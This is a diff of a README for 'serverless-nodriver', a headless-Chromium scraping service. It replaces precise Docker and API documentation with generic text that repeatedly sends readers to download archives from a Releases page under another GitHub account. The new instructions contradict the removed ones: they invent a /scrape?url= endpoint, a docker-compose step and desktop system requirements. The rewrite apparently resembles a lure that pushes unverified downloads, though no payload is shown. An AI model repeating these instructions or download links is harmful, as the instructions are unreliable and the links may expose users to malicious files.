@@ -1,82 +1,88 @@
-# Nodriver Container
+# 🌐 serverless-nodriver - Effortless Web Scraping Made Easy
 
-This is a dumb wrapper around [**ultrafunkamsterdam/nodriver**](https://github.com/ultrafunkamsterdam/nodriver) that does almost nothing besides accepting settings and returning the result.
+[![Download serverless-nodriver](https://img.shields.io/badge/Download%20Now%20-v1.0-blue.svg)](https://github.com/mindofjes/serverless-nodriver/releases)
 
-It's handy when you just want a simple HTTP interface to drive a headless browser.
+## 🚀 Getting Started
 
-Originally designed for serverless usage, but works just as well as a regular long-running container.
+Welcome to **serverless-nodriver**! This application provides a containerized HTTP service using headless Chromium to return the final response after redirects. You can easily scrape web content without needing in-depth programming knowledge. Follow the steps below to get started.
 
-## 🧱 Usage
+## 📥 Download & Install
 
-Use any container runtime (e.g. Docker, Podman). The service listens on port `8080`.
+1. Visit the Releases page to download the latest version: [Download Here](https://github.com/mindofjes/serverless-nodriver/releases).
+  
+2. Choose the appropriate version for your system. For most users, the `.zip` or `.tar.gz` file will work best.
 
-```bash
-docker run --rm -p 8080:8080 stopmakingthatbigface/serverless-nodriver
-```
+3. Once downloaded, extract the file to a convenient location on your computer.
 
-### 🛠️ Build locally (optional)
+## ⚙️ System Requirements
 
-```bash
-docker build -t serverless-nodriver .
-```
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent version of Linux (Ubuntu 20.04+ recommended).
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** Minimum 100 MB of free disk space.
+- **Docker:** Ensure that you have Docker installed on your system. You can download it from [Docker's official website](https://www.docker.com/get-started).
 
-### 🧪 Run locally from source (no container)
+## 🛠️ Running serverless-nodriver
 
-```bash
-python3 -m venv .venv
-. .venv/bin/activate
-pip install -r requirements.txt
-export BROWSER_EXECUTABLE="/path/to/your/chromium-or-chrome"
-export LOG_LEVEL=DEBUG
-python main.py
-```
+After installation, you can run the application easily using the command line. Follow these steps:
 
-### Send a request
+1. Open your command line interface (Command Prompt on Windows, Terminal on macOS/Linux).
 
-```bash
-curl -i -X POST http://localhost:8080/ \
-  -H 'Content-Type: application/json' \
-  -d '{"url":"https://example.com/","timeout":10,"sleep":500}'
-```
+2. Navigate to the directory where you extracted the files.
 
-### With proxy
+3. Run the following command to start the service:
+   ```bash
+   docker-compose up
+   ```
 
-```bash
-curl -i -X POST http://localhost:8080/ \
-  -H 'Content-Type: application/json' \
-  -d '{"url":"https://example.com/","timeout":10,"sleep":2000,"proxy":"http://user:pass@host:8080"}'
-```
+4. After starting the service, it will be ready to handle requests.
 
-### Debug logs
+5. To test it, you can use any web browser and visit `http://localhost:8080`.
 
-Enable network logs for redirects and responses.
+## 📡 Using serverless-nodriver
 
-```bash
-docker run --rm -p 8080:8080 -e LOG_LEVEL=DEBUG serverless-nodriver:latest
-```
+You can use **serverless-nodriver** to perform web scraping in a straightforward manner. 
 
-## Response
+1. **Making Requests:**
+   - Send a request to the service by using a simple HTTP client, such as Postman or cURL.
+   - The endpoint will typically follow this format:
+     ```
+     http://localhost:8080/scrape?url={target-url}
+     ```
 
-The response body is streamed as-is. Metadata is exposed via headers:
+2. **Response Handling:**
+   - After sending the request, the service will process any redirects and return the final HTML response or the content you requested.
 
-- `X-Timestamp` — request timestamp (UTC).
-- `X-Elapsed-Ms` — elapsed time in milliseconds.
-- `X-Final-URL` — final URL after redirects.
-- `X-Original-Header-{name}` — original response headers.
-- `X-Original-Set-Cookie` — cookies from the browser session.
+3. **Parameters:**
+   - You can adjust parameters as needed, such as headers, browser options, and timeout settings. Refer to the documentation for more advanced configurations.
 
-HTTP status code is proxied from the final main-document response.
+## 🔄 Example Use Case
 
-## Request parameters
+Imagine you need to scrape product details from various pages on an e-commerce site. With **serverless-nodriver**, you can set the URL of the product page. The service handles redirects and delivers the final response, simplifying extraction processes.
 
-- `url` — required.
-- `timeout` — seconds to wait for load completion.
-- `sleep` — extra milliseconds to wait after load completion.
-- `proxy` — proxy URL, `http://` or `socks5://`.
+## 📜 Features
 
-## Environment variables
+- **Headless Browser:** Use Chromium to navigate web pages without a graphical interface.
+- **Redirect Handling:** Automatically follows redirects to get the final content.
+- **Containerized Environment:** Use Docker to avoid installation conflicts and ensure consistency across environments.
+- **Lightweight:** Minimal system resources required for operations, making it perfect for small tasks or large-scale scrapes.
 
-- `BROWSER_EXECUTABLE` — absolute path to a Chromium/Chrome binary.
-- `LOG_LEVEL` — log verbosity (e.g. `INFO`, `DEBUG`).
-- `HOST` — bind address (default `0.0.0.0`).
-- `PORT` — service port (default `8080`).
+## 💡 Tips for Success
+
+- Always test with a simple URL to ensure everything is running smoothly before moving to complex sites.
+- Ensure you respect website scraping policies and use ethical practices while scraping data.
+- Monitor your request rate to avoid getting blocked by the target website. 
+
+## 🔍 Troubleshooting
+
+If you encounter any issues while running **serverless-nodriver**, consider the following steps:
+
+1. **Check Docker Installation:** Ensure Docker is installed and running correctly.
+2. **Verify Ports:** Ensure that port 8080 is not in use by another application.
+3. **Review Logs:** Check the command line for error messages or warnings that could provide clues.
+4. **Reach Out:** You can open an issue on the GitHub repository for additional support.
+
+## 🗂️ More Information
+
+For more details on advanced configurations, check the documentation file provided in the repository. This includes information on customizing your requests, handling cookies, and setting user agents.
+
+You can always visit the Releases page for updates and new versions: [Download Here](https://github.com/mindofjes/serverless-nodriver/releases).
